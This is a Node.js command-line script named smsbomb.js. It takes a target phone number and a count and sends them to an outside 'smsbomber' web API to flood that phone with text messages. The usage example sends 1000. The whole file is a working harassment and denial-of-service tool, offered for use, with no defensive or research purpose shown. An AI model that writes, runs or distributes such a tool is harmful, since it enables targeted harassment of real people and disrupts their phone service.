const axios = require("axios");
const { blue, green, red, yellow } = require("chalk");

async function smsbomb(phone, amount) {
    try {
        const response = await axios.get(`https://oreo.gleeze.com/api/smsbomber?phone=${phone}&amount=${amount}`);
        return response.data.message;
    } catch (error) {
        return error.response?.data?.error || "Something went wrong!";
    }
}

async function execute() {
    const args = process.argv.slice(2);
    if (args.length < 2) {
        console.log(yellow("Usage: node smsbomb.js <phone_number> <amount>"));
        console.log(yellow("Example: node smsbomb.js 09276547755 1000"));
        process.exit(1);
    }
    
    const phone_num = args[0];
    const amount = parseInt(args[1]);
    
    if (isNaN(amount)) {
        console.log(red("Error: Amount must be a number"));
        process.exit(1);
    }
    
    console.log(blue(`Sending ${amount} SMS to ${phone_num}...`));
    const resp = await smsbomb(phone_num, amount);
    console.log(green(resp));
}

execute();